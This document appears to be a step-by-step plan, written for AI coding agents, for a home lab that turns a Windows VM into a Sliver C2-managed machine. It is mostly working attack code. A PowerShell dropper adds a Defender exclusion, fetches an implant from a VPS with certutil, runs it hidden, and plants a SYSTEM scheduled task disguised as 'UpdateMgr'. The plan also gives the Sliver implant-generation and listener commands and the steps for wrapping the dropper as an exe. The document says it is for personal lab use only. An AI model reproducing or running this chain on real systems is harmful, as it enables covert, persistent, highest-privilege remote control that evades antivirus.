---
title: 2026-08-13-windows-dropper-lab
type: note
permalink: oscp/docs/superpowers/plans/2026-08-13-windows-dropper-lab
---

# Windows Dropper Lab Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build and test a dropper exe that turns a fresh Windows VM into a Sliver-managed shell (now + after every reboot), with Defender neutralized via exclusion.

**Architecture:** Sliver implant generated on the VPS and served over HTTP; a PS2EXE-wrapped PowerShell dropper runs in the VM (UAC → exclusion → download → run → scheduled task); sliver-server on the VPS catches sessions on port 443.

**Tech Stack:** Sliver C2 v1.7.3 (already installed at `~/sliver/sliver-server` on the VPS), python3 http.server, PowerShell + PS2EXE, certutil, schtasks.

**Spec:** `docs/superpowers/specs/2026-08-13-windows-dropper-design.md`

## Global Constraints

- VPS public IP: `2.25.141.57` — callback port `443`, payload HTTP on port `80`.
- Payload filename: `updater.exe`. Dropper filename: `UpdateMgr.exe`.
- Target folder on VM: `C:\ProgramData\Microsoft\UpdateMgr`. Scheduled task name: `UpdateMgr`.
- Payloads repo: `git@github.com:JasonSonith/payloads.git` — must stay **private**.
- VPS clone location: `~/payloads`. Sliver: `~/sliver/sliver-server` (alias `ss` starts it).
- **NEVER run `UpdateMgr.exe` or `updater.exe` on the Windows host or any machine that isn't the lab VM.** The wrapper only *builds* on the Windows host.
- Sudo on the VPS needs the user's password — those steps are run by the user.

## Prerequisites (check before Task 1)

- [ ] Windows eval VM exists (Microsoft's free Win11 dev VM or Server 2022 eval), network mode **NAT**, Firewall + Defender on.
- [ ] You can SSH to the VPS from this terminal: `ssh jason@100.125.52.98` works.
- [ ] Repo access verified earlier this session (WSL and VPS both authenticate to GitHub).

---

### Task 1: VPS listener stack [SIMPLE]

**Files:** none (server state only)

**Interfaces:**
- Produces: `http://2.25.141.57/<file>` served from `~/payloads` (Task 2, 5 consume), mTLS listener on `2.25.141.57:443` (Task 2's implant consumes).

- [ ] **Step 1: Clone the payloads repo**

```bash
ssh jason@100.125.52.98 'git clone git@github.com:JasonSonith/payloads.git ~/payloads 2>&1 || (cd ~/payloads && git pull)'
```
Expected: repo cloned (or already-present pulled). No errors.

- [ ] **Step 2: Allow Sliver to bind port 443 (user runs — needs sudo password)**

```
! ssh -t jason@100.125.52.98 'sudo setcap "cap_net_bind_service=+ep" /home/jason/sliver/sliver-server'
```
(Skip if already run earlier this session.)

- [ ] **Step 3: Firewall check (user runs — needs sudo password)**

```
! ssh -t jason@100.125.52.98 'sudo ufw status'
```
Expected: either `Status: inactive` (nothing to do) or, if active: run `sudo ufw allow 80 && sudo ufw allow 443`.
Report: paste the status line.

- [ ] **Step 4: Start the payload HTTP server (keep this SSH session open)**

```
! ssh -t jason@100.125.52.98 'cd ~/payloads && sudo python3 -m http.server 80'
```
Port 80 is under 1024, so Linux demands root for it too — same rule as 443, hence the `sudo`. The server dies when the SSH session closes; fine for a lab session. Leave it running in its own terminal.

- [ ] **Step 5: Verify the server from WSL**

```bash
curl -s http://2.25.141.57/ | head -5
```
Expected: HTML directory listing of the payloads repo. If nothing: port 80 blocked (revisit Step 3) or server not running (Step 4).

- [ ] **Step 6: Start Sliver (second SSH session, keep open)**

```bash
ssh jason@100.125.52.98
ss        # the alias: cd ~/sliver && ./sliver-server
```

- [ ] **Step 7: Start the mTLS listener — inside the Sliver console**

```
mtls --lhost 0.0.0.0 --lport 443
jobs
```
Expected: `jobs` shows an mTLS listener on port 443. If "permission denied" binding 443: setcap (Step 2) didn't happen.
Report: paste the `jobs` output.

---

### Task 2: Generate the implant [MODERATE]

**Files:**
- Create on VPS: `~/payloads/updater.exe`

**Interfaces:**
- Consumes: mTLS listener from Task 1 Step 7.
- Produces: `http://2.25.141.57/updater.exe` — consumed by the dropper script (Task 3) and tested in Task 5.

- [ ] **Step 1: Generate — inside the Sliver console**

```
generate --mtls 2.25.141.57:443 --os windows --arch amd64 --format exe --save /home/jason/payloads/
```
Expected: takes 1–2 minutes (it compiles Go code). Ends printing a random name like `SILLY_BADGER.exe` saved into `/home/jason/payloads/`.
If `generate` errors about a missing flag, run `help generate` and paste the output.

- [ ] **Step 2: Rename to the agreed payload name — from WSL (new terminal, leave Sliver running)**

```bash
ssh jason@100.125.52.98 'mv ~/payloads/<RANDOM_NAME>.exe ~/payloads/updater.exe'
```
Replace `<RANDOM_NAME>` with what Step 1 printed.

- [ ] **Step 3: Verify it's served — from WSL**

```bash
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://2.25.141.57/updater.exe
```
Expected: `200` and a size of several MB (e.g. `200 10485760`). 404 = wrong filename/location — recheck Step 2.

- [ ] **Step 4: Back up the implant to GitHub (optional but recommended) — from WSL or VPS**

```bash
ssh jason@100.125.52.98 'cd ~/payloads && git add updater.exe && git commit -m "Add sliver implant" && git push'
```
Expected: commit pushed. (Repo is private — verified.)

---

### Task 3: Write the dropper script [SIMPLE]

**Files:**
- Create in WSL: `~/payloads/install.ps1` (clone repo in WSL first if missing)

**Interfaces:**
- Consumes: `http://2.25.141.57/updater.exe` from Task 2.
- Produces: `install.ps1` in the repo — Task 4 wraps it.

- [ ] **Step 1: Clone the repo in WSL if needed**

```bash
[ -d ~/payloads ] || git clone git@github.com:JasonSonith/payloads.git ~/payloads
cd ~/payloads && git pull
```

- [ ] **Step 2: Write `~/payloads/install.ps1` with exactly this content**

```powershell
# UpdateMgr dropper - personal lab use only
$ErrorActionPreference = 'Stop'
$dir     = 'C:\ProgramData\Microsoft\UpdateMgr'
$payload = "$dir\updater.exe"
$vps     = '2.25.141.57'

try {
    Write-Host "[1/5] Adding Defender exclusion..."
    Add-MpPreference -ExclusionPath $dir

    Write-Host "[2/5] Creating folder..."
    New-Item -ItemType Directory -Path $dir -Force | Out-Null

    Write-Host "[3/5] Downloading payload..."
    certutil -urlcache -split -f "http://$vps/updater.exe" $payload | Out-Null
    if (-not (Test-Path $payload)) { throw "download failed - is http.server up on the VPS?" }

    Write-Host "[4/5] Running payload..."
    Start-Process $payload -WindowStyle Hidden

    Write-Host "[5/5] Planting persistence..."
    schtasks /create /tn "UpdateMgr" /tr $payload /sc onstart /ru SYSTEM /f | Out-Null

    Write-Host "Done. Session should appear in Sliver now, and after every reboot."
} catch {
    Write-Host "FAILED: $_"
    exit 1
}
```

- [ ] **Step 3: Commit and push**

```bash
cd ~/payloads && git add install.ps1 && git commit -m "Add UpdateMgr dropper script" && git push
```
Expected: pushed cleanly.

---

### Task 4: Wrap the dropper as an exe (Windows host) [SIMPLE]

**Files:**
- Create on Windows host: `UpdateMgr.exe` (from `install.ps1`)

**Interfaces:**
- Consumes: `install.ps1` from Task 3.
- Produces: `UpdateMgr.exe` — carried into the VM in Task 5. **Do not run it on the host.**

- [ ] **Step 1: Pull the repo on Windows**

In Windows PowerShell (normal, not admin):
```powershell
cd $HOME; git clone git@github.com:JasonSonith/payloads.git 2>$null; cd payloads; git pull
```
(If you keep the repo elsewhere, go there instead.)

- [ ] **Step 2: Install PS2EXE**

```powershell
Install-Module ps2exe -Scope CurrentUser -Force -AllowClobber
```
If it asks about the NuGet provider or untrusted repository: answer **Y**.
Expected: no red errors.

- [ ] **Step 3: Wrap**

```powershell
Invoke-ps2exe -inputFile .\install.ps1 -outputFile .\UpdateMgr.exe -requireAdmin
```
Expected: `UpdateMgr.exe` appears in the folder.

- [ ] **Step 4: Verify WITHOUT running it**

```powershell
Get-Item .\UpdateMgr.exe | Select-Object Name, Length
```
Expected: file exists, a few hundred KB. **Do not double-click it.** Defender on the host may scan/quarantine it — if it vanishes, that's host AV doing its job; add a *temporary* exclusion for this repo folder on the host, rebuild, remove the exclusion after Task 5.
Report: confirm file exists.

---

### Task 5: Run the dropper in the VM [MODERATE]

**Files:** none new (execution + observation)

**Interfaces:**
- Consumes: `UpdateMgr.exe` (Task 4), HTTP payload + listener (Tasks 1–2).
- Produces: live Sliver session as the VM's admin user.

- [ ] **Step 1: Carry `UpdateMgr.exe` into the VM**

Drag-drop / shared clipboard / shared folder — whichever your hypervisor supports. Land it on the VM's Desktop.

- [ ] **Step 2: Sanity-check the path first — inside the VM**

Open a browser in the VM: `http://2.25.141.57/updater.exe` → download should start (ignore SmartScreen: Keep). Delete the downloaded file after.
Expected: file downloads. If not — stop; network path is broken, report what the browser shows.

- [ ] **Step 3: Run the dropper — inside the VM**

Double-click `UpdateMgr.exe` → UAC prompt → **Yes**.
Expected: console window prints `[1/5]` through `[5/5]` then `Done.`
If it prints `FAILED:` — paste the exact message. If the window flashes and vanishes or Defender pops a detection — that's the known "wrapper got flagged" case from the spec; report it.

- [ ] **Step 4: Confirm the session — in the Sliver console**

```
sessions
```
Expected: one entry (VM's hostname), user = the VM's admin user. Then:
```
use <id>
whoami
```
Expected: the VM user, e.g. `lab\user`. (`exit` leaves the shell, `background` drops back to the sessions list.)
Report: paste the `sessions` line.

---

### Task 6: Verify persistence [SIMPLE]

**Files:** none

**Interfaces:**
- Consumes: scheduled task planted by Task 5.
- Produces: Sliver session as `nt authority\system` after reboot — the lab's success criterion.

- [ ] **Step 1: Keep Sliver running, reboot the VM**

In the VM: Start → Power → Restart. (Sliver console and http.server stay up on the VPS.)

- [ ] **Step 2: Watch for the new session — in the Sliver console**

Give it a minute after the VM's desktop loads:
```
sessions
```
Expected: a fresh session appears by itself.

- [ ] **Step 3: Confirm it's SYSTEM**

```
use <new-id>
shell
whoami
```
Expected: `nt authority\system`. This is the payoff: reboot-proof access, highest privilege.

- [ ] **Step 4: Confirm Defender left everything alone — in the VM (elevated PowerShell)**

```powershell
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Test-Path 'C:\ProgramData\Microsoft\UpdateMgr\updater.exe'
```
Expected: our folder listed; `True`.
Report: paste both outputs.

---

### Task 7: Cleanup (keeps the VM reusable) [SIMPLE]

**Files:** none

- [ ] **Step 1: Remove persistence + exclusion + files — in the VM (elevated PowerShell)**

```powershell
schtasks /delete /tn "UpdateMgr" /f
Remove-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\UpdateMgr'
Remove-Item -Recurse -Force 'C:\ProgramData\Microsoft\UpdateMgr'
```

- [ ] **Step 2: Kill sessions — in the Sliver console**

```
sessions -k -a
```
(`-a` = all. Or kill individually: `sessions -k <id>`.)

- [ ] **Step 3: Stop the VPS servers when the lab is done**

Ctrl-C the http.server SSH session; `exit` the Sliver console.
Note: implant exe remains in the private repo as your reusable artifact — that's intended.

- [ ] **Step 4: Snapshot the VM (recommended)**

Take a hypervisor snapshot now — clean slate for the next lab (e.g. beacon mode).

---

## Self-review notes

- Spec coverage: VPS setup (T1), implant (T2), dropper script + wrap (T3–4), run + test plan steps 1–4 (T5–6), cleanup (T7), security constraints (Global Constraints + T4 Step 4 warning). Manual nc fallback is documented in spec; not a plan task since it's debug-only.
- No placeholders: every command is exact; `<id>`/`<RANDOM_NAME>` are runtime values the executor reads from prior output, each with instructions.
- Consistency: filenames/ports/folders match Global Constraints everywhere.